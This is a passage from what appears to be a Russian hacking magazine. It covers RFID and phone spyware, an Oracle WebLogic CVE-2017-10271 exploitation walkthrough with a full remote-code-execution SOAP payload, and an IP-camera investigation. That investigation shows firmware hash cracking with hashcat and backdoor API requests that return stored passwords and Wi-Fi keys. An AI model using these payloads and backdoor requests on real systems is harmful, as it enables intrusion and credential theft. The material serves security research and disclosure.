berg // Denver University Law Review. 79(4), 2002. pp. 534-539,
558-565.
  В 1999 году Массачусетский университет инициировал проект Auto‐ID,
целью которого было соз дание «физичес ки связанного мира», где каждый
элемент на планете инвентаризован, каталогизирован и отслеживается. Сей‐
час существуют RFID‐маячки раз мером 0,3 мм, тонкие, как человечес кий
волос. Они легко могут быть размещены в денеж ных банкнотах, что дает
спецслужбам возможность следить за исто рией денежных опе раций. Такая
инициатива исклю чает ано нимность обмена наличными средствами.
   «Холодильники, которые сообщают в супермаркет о своем содержимом».
«Интерактивное телевидение, выбирающее релевантную для вас рекламу»
(например, на основании содержимого вашего холодильника). Все это —
реальность наших дней. Auto‐ID, в сочетании с RFID‐сканерами, установ‐
ленными в книжных полках (так называемые смарт‐полки), может предос‐
тавлять исчерпывающую информацию о поведении потенциальных пот‐
ребителей. Более того, иногда такие RFID‐ска неры устанавливаются в пред‐
меты интерьера даже без ведома конечного потребителя.
   У тебя дома и в сумочке нет ни одного RFID‐микрочипа? Подозрительный
ты парень, потенциальный террорист. ;) Сегодня правительственные спец‐
службы всерьез размышляют над тем, чтобы «в целях противодействия тер‐
роризму»  (ну, как обычно) оцифровать всю жиз неде ятельность каждого
человека и отсле живать ее в режиме реального времени.
  Смотри, что пишут на эту тему умные люди:



      «Ключ к победе над тер рорис тами — воз можность оциф ровать абсо-
      лютно всех людей и раз местить их на нашем циф ровом поле боя.
     Идентифицируя каждого челове ка и отсле живая его переме щение
      в режиме реального вре мени, мы будем способны сра зу же узна вать
      о его подоз рительной активнос ти. А если человек не оциф рован, зна-
       чит, он — потенциальный тер рорист. Оциф ровать населе ние можно,
      встра ивая RFID-маяч ки: в документы,  автомобильные пра ва, биб-
      лиотеч ные билеты, кор поратив ные удос товере ния, пас порта, визы,
     номер ные зна ки и так далее. Полностью оциф ровав населе ние, мы
      будем знать, кому что принад лежит. Потом мы сможем, обра баты вая
      все эти данные на мощ ных компьюте рах, выяв лять подоз рительную
       активность. Мы можем  отсле живать людей  внутри  транспортных
      средств, пос редс твом триангу ляции RFID-маяч ков (использовать уста-
      нов ку из трех RFID-ска неров, раз мещенных, нап ример, в фонар ных
      столбах).  Все  транспортные  средс тва,  переме щающиеся  между
      города ми, так же должны иметь RFID-маяч ки (на водительских пра вах,
      документах).  Когда  эти  транспортные средс тва  будут сближаться
      с RFID-ска нером, встроенным в дорожное асфальтовое пок рытие, мы
     сможем  идентифицировать  как  автомобиль,  так  и  его  текуще го
      водите ля. Таким обра зом мы сможем качес твенно выяв лять подоз-
      рительную активность населе ния».
          Counterinsurgency Airpower // Air & Space Power Journal. 20(4), 2006. p. 16


9. ТАЙНАЯ ЖИЗНЬ ТВОЕЙ SIM-КАРТЫ
Источник, инструк ция по эксплу атации: The Secret Life of SIM
Cards // DEF CON 21. 2013
   SIM‐карта — это таинс твен ный малень кий компьютер в твоем кармане,
который тебе неподконтролен. SIM‐карта может намного больше, чем просто
быть посредником при авториза ции на тво ем мобиль нике. Простейшие при‐
ложения можно загружать и выполнять пря мо на SIM‐карте — отдельно
от мобильника, даже не зная, какая на мобиль нике опе рационная система.
Эти приложения могут:
 • переходить по URL‐адресам;
 • отправлять SMS;
 • инициировать и принимать вызовы;
 • подклю чать и использовать информа ционные службы;
 • запускать AT‐команды на мобильнике.

Приложения на SIM‐карту загружа ются в «тихом режиме» — посредс твом
пакетной передачи данных через удален ный доступ. Обновлять приложения
на SIM‐карте может либо мобильный оператор, либо злоумышленник, прит‐
воряющийся мобильным оператором (например, при помощи IMSI‐перех‐
ватчика). Подробная инс трукция о том, как это сделать, находится в открытом
доступе.


10. МОБИЛЬНЫЕ ТРОЯНЫ, ИЛИ СТАРЫЕ ТЕХНОЛОГИИ ЕЩЕ В
СТРОЮ
Источник: окру жающая реальность
  Новые технологии шагают по планете, не отменяя при этом проверенной
классики — вредоносного ПО.
  Существует несколь ко десятков шпионских прог рамм, которые могут быть
удаленно установ лены на мобильник в «тихом режиме» и шпионить за его
владельцем, не выдавая своего присутствия. Ранее считалось, что, придер‐
живаясь так называемой гигиены кибербезопасности, можно надежно огра‐
дить себя от подоб ного вмешательства в свою личную жизнь. Однако сегодня
жертвой мобильного шпионажа могут стать даже те, кто избегает рис кован‐
ного поведе ния в Сети, кто использует самую современную защиту и самое
свежее обновле ние программного обеспечения.
   Благодаря последним средс твам защиты часть программ‐шпионов можно
отследить. Однако для того, чтобы поддерживать эти средства защиты в акту‐
альном состоянии, нужно уметь их настра ивать. Ведь атакующие точно так же,
как и безопасники, не сидят на мес те и прикладыва ют значительные усилия,
чтобы скрыть свои программы от автомати зированных систем защиты.
При этом настраивать защиту с течением времени становится все сложнее,
а проводить успешные атаки — все проще. В том числе потому, что с подачи
западных спецслужб самые  современные информационные  технологии
сегодня находятся в открытом доступе. В резуль тате такой политики откры‐
тости возрастает риск использования  хай‐тек‐игрушек насмотревшейся
фильмов про хакеров молодежью, непредсказуемой и импульсивной.
   Есть  мнение,  что  широко  раз рекламированные  сегодня   утечки
хай‐тек‐игрушек ЦРУ вовсе не демарш Сноудена и WikiLeaks, а контролиру‐
емая утечка информации, имеющая целью направить конкурентов по «гонке
вооружений» в заведомо про игрышном направлении; чтобы они продолжали
вкладывать время и деньги в инс тру менты, которые уже не обес печивают кон‐
курентного преимущества. Кибероперации и инфоцентри ческие войны уже
не служат ключом к нему. Сегодня бал правят зна ниецентрические войны,
суть которых сводится к тому, что «людей лома ют профессионалы, а не
машины».
   Таким образом, мы наблюдаем сегодня все возрастающую экспонен‐
циальную асимметрию кибербезопас ности: ата кующие находятся в более
выгодных условиях, чем защищающиеся. Ежегодный прирост мобильных
угроз составляет 42%. Ниже приведены несколько примеров шпионских
программ, которые распространяются как легаль ные — под видом так
называемых систем родитель ского контроля и им подобных. Все они скры‐
вают свои действия от владельца мобильника.
   Neo-Call Spy. Первоначально соз данная под Symbian, теперь работает
также и на iPhone, BlackBerry, Android, Windows Phones. Отправляет информа‐
цию непосредственно на дру гой мобильник. Эта программа основана
на номере IMEI, то есть злоумыш ленник должен знать свою цель. Программа
отслеживает SMS, список звонков, местоположение; удаленно прослушива‐
ет, журналирует нажатия клавиш. Команды она получает с управля юще го
мобильника в скрытых SMS‐сооб щениях.
  Mspy. Работает на смартфонах и планшетах. Позволяет сле дить за звон‐
ками, SMS, сообщениями электронной почты, местоположением GPS, исто‐
рией просмотра, календарем, адресными книгами, IM‐сообщениями; поз‐
воляет  управлять  установленными приложениями, просматривать  муль‐
тимедиафайлы. Также имеет функции уда лен ного контроля, такие как пол ное
стирание устройства и сбор подробной отчетности. Для сбора и предос‐
тавления информации использует безопасную учетную запись в интернете —
при помощи архитектуры клиент‐сервер, с веб‐интерфейсом.
   FlexiSpy. Эта программа изна чально классифицирована как мобильный
троян из‐за ее агрессивного поведения; но затем она стала вес ти себя мяг‐
че, и ее из категории мобильных троянов вычеркнули. Она позволяет шпи‐
онить за мобильниками и планшетами. Предлага ет порядка 130 функций,
в том числе те, которыми оснащена Mspy. Из уникальных функций: доступ
к видеокамере, просмотр обо ев. Так же как и Mspy, для сбора и пре дос тавле‐
ния информации использует безопас ную учетную запись в интернете —
при помощи архитектуры клиент‐сервер, с веб‐интерфейсом.
   Mobile Spy. Обладает большинс твом функций FlexiSpy; вдобавок может
блокировать приложения, устанавливать новые приложе ния и в режиме
реального времени взаимо действовать с панелью управле ния пользователь‐
ского интерфейса мобильника.
   Higster Mobile. Прос тая в исполь зовании программа для мониторинга:
текстовые сообщения, запись телефонных переговоров, журналы звонков…
все отправляется с телефона жертвы либо на электронную почту, либо
на мобильник, либо на безопасную учетную запись в интерне те.
   All-in-one  Spy  Software. Высококачественное ПО  для шпи онажа
за мобильником, развивается с 2006 года.
  Spyera. Программа, уста навливаемая на смартфон, для контроля за всем
происходящим на мобиль нике. Тайно записывает все события (SMS, история
вызовов, телефонная книга, мес тополо жение, электронные письма, сооб‐
щения приложе ний, IM, чат Facebook, Skype и многое дру гое), которые про‐
исходят на телефоне, и дос тавляет эту информацию в защищенный веб‐акка‐
унт.
  SpyMaster. Наиболее эффективное и продвинутое программное обес‐
печение  для  мобильного  шпионажа.  Стопроцентно  скры тый  режим,
не оставляет никаких шансов на свое обнаружение. По крайней мере, так
утверждают разработчики.


ОТ РЕДАКЦИИ, ИЛИ ВМЕСТО ЗАКЛЮЧЕНИЯ
Эпоха тотального цифрового контроля стоит на пороге, и, скорее все го, ее
полноценный приход зас танет уже нынешнее поколение. Бороться поздно,
и похоже, что только здо ровый пофигизм поможет обществу справиться
с этой проблемой (да‐да, игнорируя ее). Примеры его проявления мы уже,
кстати, видим как со сто роны «следящих», так и со стороны «поднадзорных».




      «Какое фото, какое видео? Не зна ем, нам лень смотреть камеры (они
      сломались, в них ничего не вид но, они смотрят в дру гую сторону),
      а даже если и пос мотрим — то как узнать, кому это лицо принад-
      лежит? И вор ли это, или прос то мимо проходил? В общем, мы
      не зна ем, кто обнес вашу квар тиру и угнал вашу машину, обра щай-
      тесь‑ка вы... куда‑нибудь».
         «Угна ли  голые  фотографии?  Ну  ничего  страш ного,  полез но
      для популяр ности».
ВЗЛОМ





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity

ПЛОХАЯ ЛОГИКА

         ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД
      В ПОПУЛЯРНОМ СЕРВЕРЕ ПРИЛОЖЕНИЙ
                       ORACLE WEBLOGIC




Новая уязвимость в Oracle WebLogic позволяет выполнять
произвольные команды на целевой системе любому ата‐
кующему без какой‐либо авторизации. Раз беремся, что
именно должен делать ата кующий и почему это работает.


Сервер приложе ний WebLogic, как и большинс тво продуктов Oracle, широко
распространен в энтерпрайз‐среде и использует ся крупными компаниями
по всему миру. Проб лемы, подобные этой, могут грозить огромны ми убыт‐
ками и повлечь за собой утечки приватных данных.
  Продукты компании PeopleSoft, производящей ПО для управле ния базами
клиентов, финансового планирования и управления персоналом, тоже под‐
вержены этой уязвимос ти, поскольку один из компонентов — это сервер
WebLogic.
  Проблема зак лючается в некорректной фильтрации данных при парсинге
пользовательско го запроса в XML перед переда чей его в XMLDecoder. Отве‐
чает за это модуль WLS Security. Уяз вимость получила номер CVE‐2017‐
10271 — это логическое про должение не до конца запатченной CVE‐2017‐
3506 в модуле Web Services. Баг затрагива ет версии WebLogic до 10.3.6.0.0,
12.1.3.0.0, 12.2.1.1.0 и 12.2.1.2.0.


ПОДГОТОВКА
Сначала поднимем и нас троим наш первый в 2018 году стенд для тес тирова‐
ния уязвимости. Я сижу на винде и поэтому буду использовать win‐версию
сервера WebLogic.
  Для того чтобы загрузить сам дис трибутив, тебе понадобится рабочий
аккаунт Oracle. Если у тебя его нет, то можешь зарегистрироваться тут. Далее
переходим  в  раздел  загрузок,  принима ем  лицензионное  соглашение
и выбираем нужную версию дистрибутива для загрузки.
  Рекомендую использовать ветку 10.3.6, так как там сразу работает уяз‐
вимый модуль. Windows Oracle WebLogic распространяется в виде инстал‐
лятора, в котором уже имеется JDK, ведь дистрибутив написан на Java и тре‐
бует Development Kit для работы.





                 Ин сталлятор WebLogic 10.3.6.0.0

Сразу после завершения установки тебе предложат запус тить и настроить
рабочее окружение. Не вижу смысла отка зывать в этом.





                 Компоненты JDK в инсталляторе

После всех настроек мы получа ем готовую рабочую среду для тестирования
уязвимости.





                    Стартовая стра ница WebLogic

Если ты используешь Linux, то рекомендую поднять окру жение через Docker,
благо в репозитории ты уже можешь найти готовые сборки WebLogic. Вот,
например, одна из них.


ДЕТАЛИ
Давай сразу же проверим работу эксплоита. Загрузить один из вариантов
PoC можно отсюда.
  Для корректной работы в качестве параметра нужно указать адрес сер‐
вера WebLogic. По умолчанию скрипт отправляет запрос с эксплоитом к роуту
/wls‐wsat/CoordinatorPortType.


CVE-2017-10271/exploit.py
54:     url_in = sys.argv[1]
55: do_post(url_in, command_in)


CVE-2017-10271/exploit.py
42: def do_post(url_in, command_in):
43:     payload_url = url_in + "/wls‐wsat/CoordinatorPortType"

После запуска PoC будет предложено ввес ти команду, которую нужно выпол‐
нить на удаленной системе.


CVE-2017-10271/exploit.py
53:     command_in = raw_input("Enter your command here: ")





        Успешная эксплуата ция CVE‐2017‐10271 в Oracle WebLogic

Поскольку это логическое продолжение уязвимости CVE‐2017‐3506, сначала
взглянем, что делает патч, который Oracle выпус тила для нее. Нужные нам
файлы находятся в фай ле /lib/weblogic.jar, поэтому его надо декомпиль‐
нуть, например с помощью Java Decompiler.





           Декомпиляция weblogic.jar в Java Decompiler GUI

Нас интересует файл WorkContextXmlInputAdapter.java. Вместе с апрель‐
ским патчем разработчики добавили метод validate.


WorkContextXmlInputAdapter.java
21: public final class WorkContextXmlInputAdapter
22:   implements WorkContextInput
23: {
24:   private final XMLDecoder xmlDecoder;
25:
26:   public WorkContextXmlInputAdapter(InputStream is)
...
47:   private void validate(InputStream is)
48:   {
49:     WebLogicSAXParserFactory factory = new WebLogicSAXPars
erFactory();
50:     try
51:     {
52:       SAXParser parser = factory.newSAXParser();
53:       parser.parse(is, new DefaultHandler()
54:       {
55:         public void startElement(String uri, String localName,
String qName, Attributes attributes)
56:           throws SAXException
57:         {
58:           if (qName.equalsIgnoreCase("object")) {
59:             throw new IllegalStateException("Invalid context
type: object");
60:           }
61:         }
62:       });
63:     }

Он проверяет переданный XML‐запрос на наличие элементов Object, и если
такой встречается, то скрипт кида ет исключение Invalid context type:
object.
  Однако не Object’ом единым живет RCE. Существу ет еще множество спо‐
собов проэксплуатировать уязвимость в десери ализации XML. Пос мотрим
на этот же файл, но уже из последней версии, где уязвимость исправлена.


WorkContextXmlInputAdapter.java
47:   private void validate(InputStream is)
48:   {
49:     WebLogicSAXParserFactory factory = new WebLogicSAXPars
erFactory();
50:     try
51:     {
52:       SAXParser parser = factory.newSAXParser();
53:       parser.parse(is, new DefaultHandler()
54:       {
55:         public void startElement(String uri, String localName,
String qName, Attributes attributes)
56:           throws SAXException
57:         {
58:           if (qName.equalsIgnoreCase("object")) {
59:             throw new IllegalStateException("Invalid context
type: object");
60:           }
61:           if (qName.equalsIgnoreCase("object")) {
62:             throw new IllegalStateException("Invalid element
qName:object");
63:           } else if (qName.equalsIgnoreCase("new")) {
64:                throw new IllegalStateException("Invalid element
qName:new");
65:           } else if (qName.equalsIgnoreCase("method")) {
66:                throw new IllegalStateException("Invalid element
qName:method");
67:           } else {
68:             if (qName.equalsIgnoreCase("void")) {
69:               for(int attClass = 0; attClass < attributes.getLen
gth(); ++attClass) {
70:                 if (!"index".equalsIgnoreCase(attributes.getQName
(attClass))) {
71:                   throw new IllegalStateException("Invalid attrib
ute for element void:" + attributes.getQName(attClass));
72:                 }
73:               }
74:             }
75:             if (qName.equalsIgnoreCase("array")) {
76:               String classElem = attributes.getValue("class");
77:               if (classElem != null && !classElem.equals
IgnoreCase("byte")) {
78:                 throw new IllegalStateException("The value of
class attribute is not valid for array element.");
79:               }

Как видишь, список неугодных элементов рас ширился. :) Значит, помимо Ob‐
ject, потенциально небезопасны также и new, method, void и array в некоторых
случаях. Теперь взглянем на запрос, который отправляет экс плоит.


POST /wls‐wsat/CoordinatorPortType HTTP/1.1
Host: weblogic.visualhack:7001
content‐type: text/xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/
envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/
workarea/">
      <java class="java.beans.XMLDecoder" version="1.8.0_151">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0">
              <string>cmd</string>
            </void>
            <void index="1">
              <string>/c</string>
            </void>
            <void index="2">
              <string>calc</string>
            </void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

Разумеется, хидер Content‐Type дол жен быть text/xml, потому что мы тут
отправляем на парсинг XML. В теле запроса, что бы вызвать класс Process‐
Builder, используется элемент типа void. Эксплоит отправляет запрос
на эндпойнт CoordinatorPortType, одна ко уяз вим не только он. Другие мож‐
но отыскать, если заглянуть в файл web.xml из wls‐wsat.war.





     Просмотр путей, которые мож но использовать для экс плуатации


CoordinatorPortType
RegistrationPortTypeRPC
ParticipantPortType
RegistrationRequesterPortType
CoordinatorPortType11
RegistrationPortTypeRPC11
ParticipantPortType11
RegistrationRequesterPortType11

Сам  запрос  обрабатывается  адаптером  WLSServletAdapter,  который
передает данные в метод ProcessRequest из файла WorkContextServer‐
Tube.java  (ты можешь найти его в декомпилированном weblogic.jar
по пути weblogic.wsee.jaxws.workcontex).


WorkContextServerTube.java
19: public class WorkContextServerTube
20:   extends WorkContextTube
21: {
...
39:   public NextAction processRequest(Packet request)
40:   {
41:     this.isUseOldFormat = false;
42:     if (request.getMessage() != null)
43:     {
44:       MessageHeaders hl = request.getMessage().getHeaders();
45:       Header hn = hl.get(this.JAX_WS_WORK_AREA_HEADER, true);
46:       if (hn != null)
47:       {
48:         readHeader(hn);
49:       }
50:       else
51:       {
52:         Header h = hl.get(WorkAreaConstants.WORK_AREA_HEADER,
true);
53:         if (h != null) {
54:           if (supportWorkContextOldFormat) {
55:             readHeaderOld(h);
56:           } else {
57:             throw new WebServiceException("Old format work area
header is disabled.");
58:           }

Переменная h ссылается на раздел work:WorkContext из тела запроса, он
отправляется в метод readHeadOld для дальнейшей обработки.


WorkContextTube.java
104:   protected void readHeaderOld(Header header)
105:   {
106:     try
107:     {
108:       XMLStreamReader reader = header.readHeader();
109:       reader.nextTag();
110:       reader.nextTag();
111:       XMLStreamReaderToXMLStreamWriter x = new XMLStreamReader
ToXMLStreamWriter();
112:       ByteArrayOutputStream baos = new ByteArrayOutputStream();
113:       XMLStreamWriter writer = XMLStreamWriterFactory.create(
baos);
114:       x.bridge(reader, writer);
115:       writer.close();
116:       WorkContextXmlInputAdapter xia = new WorkContextXmlI
nputAdapter(new ByteArrayInputStream(baos.toByteArray()));
117:       receive(xia);

Тут переменная xia содержит переданный нами сериализованный массив
объектов. Затем выполняется функция receive в контексте переданных дан‐
ных, которая, в свою очередь, вызывает метод readUTF, и он триггерит уяз‐
вимость.


WorkContextXmlInputAdapter.java
194:   public String readUTF()
195:     throws IOException
196:   {
197:     return (String)this.xmlDecoder.readObject();
198:   }

Тут мы и получаем картину, которую наблюдали в самом начале, — успешную
эксплуатацию и выпол нение произвольного кода.





         Успешная эксплуата ция RCE в Oracle WebLogic 10.3.6.0.0


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
За последние два года Oracle закрыла огромное количество уязвимостей
во всех своих про дуктах, а Ларри Эллисон, один из основателей, заявил, что
необходимо усилить безопас ность про дуктов компании, так как они часто
играют ключевую роль для биз неса.
   Эту уязвимость уже облюбова ли зло умышленники, написав использующий
ее троян‐майнер. После успешной эксплуата ции на сервер устанавливался
майнер криптовалю ты Monero xmrig, а процесс самого приложе ния WebLogic
убивался. Судя по некото рым отчетам, зло умышленникам удалось «зарабо‐
тать» таким способом около 226 тысяч дол ларов.
   Эту атаку обнаружил и разоб рал по полочкам (за что ему огромное спа‐
сибо) Ренато Мариньо (Renato Marinho), исследова тель безопасности в Mor‐
phus Labs. Его смутили пос тоянные сбои в работе серверов WebLogic из‐за
их перегрузки.
   Патч для устранения уязвимости вышел еще в октябре 2017 года. Только
вот никто не торопится обновляться, и на прос торах Сети обитает еще много
бажных серверов. Если ты администра тор одного из них, то поспеши накатить
свежие апдейты.
ВЗЛОМ

 «Я ХОТЕЛ ЕЕ ТОЛЬКО
   НАСТРОИТЬ ...»





                                          VS





       КАК Я ИСКАЛ УЯЗВИМОСТИ
           В IP‐КАМЕРАХ
           И НАШЕЛ ИХ





Новостями про уязвимости в тех или иных моделях IP‐камер
уже  сложно  кого‐то  удивить.  Регулярно  появляется
информация о разнообразных багах и недокументированных
учетных записях (бэкдорах). Несмотря на это, многие про‐
изводители до сих пор относятся к безопасности своей про‐
дукции кое‐как. Об одном из таких случаев и хочу расска‐
зать.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.


Начну с предыстории. Я и мой коллега внедряли распределенную систему
видеонаблюдения на несколько сотен IP‐каналов. Модель камеры выбрали
быстро — сыграла роль привлекательная цена и приличные ТТХ. Экземпляры,
взятые на тестирование, показа ли себя нормаль но, работали стабильно,
без нареканий.
  Поскольку камер мы планировали покупать много, то потребовалось авто‐
матизировать их настройку. Зас тавить нормально работать штатную утилиту
(IPCManager) я так и не смог, поэто му пришлось изобретать свой велосипед.
  По задумке управление камерой будет происходить через запросы
по HTTP на 80‐й порт скриптом на Python с использованием библиотеки
requests.
  Процесс должен сводиться к простому алгоритму:
 1. Запустил скрипт.
 2. Достал из короб ки камеру.
 3. Подклю чил.
 4. Получил оповеще ние о завершении перенастройки.
 5. Отключил.
 6. Подклю чил сле дующую.
 7. Далее по циклу.

В качестве оповеще ния об успешной перенастройке логично было бы
использовать звуковой сигнал из динамика камеры. Однако зас тавить камеру
пищать при помощи запроса по HTTP так и не получи лось.


СОБИРАЕМ ИНФОРМАЦИЮ
Я начал поиски альтернативного способа подчинить себе динамик камеры —
просканировал камеру при помощи Nmap.





                         Уже немало...

С портами 80 (HTTP) и 554 (RTSP) все понят но, 1935‐й порт вроде
как используется приложением Flash, через которое браузер показывает
видео с камеры, а вот что висит на остальных портах — пока загадка.
  Мое внимание привлек открытый 23‐й порт. Но вот незадача — логин
и пароль от веб‐интерфейса к Telnet не подходят, в интернете на этот счет
ничего  нет,  а  техподдержке  поставщика  пароль  неизвестен.  Через
веб‐интерфейс настроить или отключить  Telnet нельзя, остается только
гадать, для чего или для кого он вообще работа ет. Но ведь если есть Telnet,
значит, должны быть и учетные данные на него. Что ж, придется искать.
  Почти все манипуляции я проводил в Ubuntu desktop 16.04. Для начала я
скачал прошив ку камеры и начал ее изу чать. Нужно заметить, что прошивки
для исследуемой камеры в зависимос ти от версии могут иметь раз ное
содержимое. Мне попада лись следующие варианты содержимого архива
с прошивкой.
 1. Файлы .rootfs и .fm . Первый содержит кор невую файловую систему,
   вклю чая искомый etc\passwd с паролем на Telnet, второй — включает
   «брендированный обвес» — веб‐интерфейс с логотипом и другими инди‐
   видуальными особенностями конкретного продавца (об этом позже).
 2. Файл .fm , который корневую ФС не включает.
 3. Файл .fm , внутри которого сра зу корневая ФС и «обвес».

Далее попробовал определить тип фай ла командой ﬁle.


$ file ‐b ‐i IPCAM_BV_EW_11_E_V2.37.170715_Airlink.fm
application/octet‐stream; charset=binary

Для дальнейших манипуляций с файлами прошивки понадобится утилита bin‐
walk.  Забегая  вперед, отмечу  еще,  что обязательно  наличие  модуля
jeﬀerson — для распаковки JFFS2.


        WWW

                     На странице проекта в GitHub есть вся необ‐
                      ходимая информация по установке.


Я заглянул внутрь бинарника при помощи binwalk.





                      Вывод binwalk

Squashfs — это специализиро ванная сжатая файловая система, которая час‐
то применяется в роутерах, IP‐камерах и прочих IoT‐устрой ствах, а JFFS2 —
файловая система, часто используемая на флеш‐памяти. В интерне те можно
найти несколько способов монтирования JFFS2 и Squashfs, но проще всего
распаковать их через тот же binwalk.


binwalk ‐Me  IPCAM_BV_EW_11_E_V2.37.170715_Airlink.fm
binwalk ‐Me  IPCAM_BV_EW_11_V2.37.170715.rootfs

где
 • e включает режим извлечения;
 • M пытается распаковывать вложенные элементы.

В итоге получилось два катало га с содержимым прошивки. В каталоге _IP‐
CAM_BV_EW_11_V2.37.170715.rootfs.extracted можно найти файл etc/
passwd, внутри которого находится хеш типа MD5 (Unix). Брутанув этот хеш
с помощью John или hashcat, можно получить иско мый пароль для подклю‐
чения по Telnet.
   Вот пример запуска бру та через hashcat:


hashcat64 ‐m 500 ‐a 0 ‐‐force usr\hashes.txt dict\worst_passwds.dict
‐o usr\recovered.txt

Здесь
 • m 500 — тип хеша, который будем бру тить, 500 — md5crypt / MD5 (Unix);
 • a 0 — режим работы, 0 — ата ка по словарю;
 • force — игнориро вать предуп реждения;
 • usr\hashes.txt — файл, в который я положил взламываемый хеш;
 • dict\worst_passwds.dict — сло варь;
 • o usr\recovered.txt — файл, в который будет записан восстанов‐
   ленный пароль.

Hashcat отработал очень быстро, так как пароль тривиален и есть в популяр‐
ных словарях. Учетки на Telnet получены, но моя история только начинается...


ИССЛЕДУЕМ СТРОКИ. УЗНАЕМ ИСТИННОГО ПРОИЗВОДИТЕЛЯ
КАМЕРЫ
Я решил продолжить свое импровизированное исследование и посмотреть
на другие файлы, извлеченные из прошивки, пос мотрел, что и как стартует
при загрузке камеры.
  Файл /squashfs‐root/etc/init.d/rcS  показывает,  что  запускается
скрипт /home/bvtech/start_ipcam.sh, а этот скрипт стартует Telnet, cmd‐
serv, reset, daemonserv и bvipcam.
  Используя доступ через Telnet с правами root, гля нул, как демоны слушают
порты.





                 Вывод netstat ‐ltupn с камеры

Получается, что bvipcam — основное приложение, отвечает практически
за всю работу камеры, в том числе веб‐интерфейс, FTP, RTSP и прочее.
Взглянем на него повнимательней.
  Я попробовал извлечь последова тельности печатных символов из бинар‐
ного файла bvipcam при помощи утилиты strings. Например, команда ниже
выведет в файл strings.txt печат ные символы, которые встре чаются сери‐
ями более четырех подряд.


strings ‐n 5 bvipcam > strings.txt

Бинарник оказался ничем не запакован, уда лось достать дос таточно много
строк.





                      Часть вывода утилиты strings

Когда смотрел strings.txt, внимание привлекла эта строка:


User‐Agent: www.brovotech.com/Marketing@brovotech.com

Насколько я смог понять, этот заголовок будет подставляться в запросы
от камеры к сервисам DDNS.
  В файлах прошив ки постоянно упо мина ется какой‐то bvtech:
 • /home/bvtech в путях;
 • XMailer: sz.brovotech в заголовке;
 • Server: Brovotech в заголовке HTTP‐сервера;
 • в строке UserAgent.

Возникает вопрос: кто же такие Brovotech? На сай те www.brovotech.com я гля‐
нул список продукции и нашел близ неца своей камеры, которую купил в Рос‐
сии под совершенно другим брендом.





                      Брат‐близнец моей камеры

Возникла мысль, что Brovotech выпус кает камеры, пишет для них прошивки,
а потом брендирует под кого‐то и продает. Но это нужно было проверить.
  Поскольку сервер HTTP имеет вполне узнаваемый заголовок Server:
Brovotech/2.0.0, решил поискать подоб ные камеры через Shodan.





                Поиск ана логичных камер в Shodan

Почти все найденные устройства были закрыты паролем, но оказалось, что
у этого семейства камер есть QR‐код, который доступен по URI /logo/qr‐
code.png без аутентифика ции.
  После декодирования QR‐кода выяснилось, что он в большинстве случаев
содержит указание на модель камеры и ее MAC‐адрес. Проанализи ровав
данные с QR‐кодов, обна ружил, что они принадлежат разным моделям камер
разных брендов.
   Встретились камеры нескольких российских брендов, китай ские, поль‐
ские, турецкие... Видимо, производитель Brovotech неплохо продает свою
продукцию, и не толь ко в России. ;)


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  «Я ХОТЕЛ ЕЕ ТОЛЬКО
        НАСТРОИТЬ...»
              КАК Я ИСКАЛ УЯЗВИМОСТИ В IP‐КАМЕРАХ
                               И НАШЕЛ ИХ





АНАЛИЗИРУЕМ ТРАФИК. УЗНАЕМ ПРО БЭКДОР
Располагая информацией о поставщиках, я стал собирать информацию
о программном обеспечении камер. Надеялся, что у дру гих поставщиков
на сайте будет удоб ный и работающий инс трумент для автоматизации нас‐
тройки камер, с поиска которого и началась моя исто рия.
  На сайте одного из рос сийских продавцов я нашел настоящую жем‐
чужину — ПО для простого сброса текущего пароля без каких‐либо допол‐
нительных  телодвижений.  Единс твенное  условие —  нужно  находиться
в одном сегменте L2 с камерой. Программа называ лась RSTPWD_V1.01.exe
и находилась в архиве Reset_Password.rar.





  Волшебная утилита, по недос мотру пос тавщика попавшая в открытый
  доступ

Глянул при помощи Wireshark на ее трафик...





        Вот что происходит при нажатии restore password в RSTPWD

Оказалось, утилита общается с камерой по порту 6000, текстовым протоко‐
лом, без шифрования, а для аутентифика ции на камере используются логин
и пароль... Захар дкоженные. Недоку ментированные. Изменение или отклю‐
чение которых невозможно.
  Я поковырял эту апишку (6000 TCP), нашел кое‐что интересное. Для при‐
мера привожу несколько забавных штук.


telnet IP_адрес_камеры 6000


LOGIN BVT/1.0
cseq: 1
username: ***
password: ***

В конце запроса нужно нажать Enter дважды.
  Получаем сессионный ключ (userid), с которым будем делать дальнейшие
запросы в рамках Telnet‐сес сии.
   Вот такой запрос вернет список всех пользователей вместе с их пароля‐
ми, которые были заведены на камере через веб‐интерфейс. ;) Не сбросит!
А именно заботливо вер нет. Все открытым текстом, никаких хешей!


GET_PARAMETER BVT/1.0
userid:  _USERID_
cmd: 47
cmdtype: 0
chn: 0
streamidx: 0
cseq: 3

А вот этот запрос вернет SSID и ключ Wi‐Fi‐сети, к которой подключена
камера. Удобно!


GET_PARAMETER BVT/1.0
userid:  _USERID_
cmd: 19
cmdtype: 0
chn: 0
streamidx: 0
cseq: 3

Еще из полезного можно получить учетки от PPPoE, SMTP, FTP.
  И самое главное — вшитые учетные данные для этой апишки подходят
для логина через веб‐интерфейс с правами админис тратора.
  Выше я говорил про бинарный файл bvipcam, который отве чает за вза‐
имодействие камеры с внешним миром. Нас коль ко я вижу, недокумен‐
тированные учетные данные находятся именно в нем. Их можно обнаружить
при помощи hex‐редактора или той же утилиты strings. Ай да китайцы, ай
да красавчики!
  Проверил наличие вышеописанных «особенностей» на своих камерах
с использованием прошивок разных вер сий, а также на одной камере дру гой
марки, которую предоставил коллега. Баги были обнаружены во всех слу чаях.
   Есть основания полагать, что «болезнь» охватывает весьма широкий
спектр камер Brovotech.


ВОЗМОЖНОСТИ УДАЛЕННОГО ДОСТУПА
Думаешь, на этом все? Еще нет. Многие модели камер, как сейчас модно,
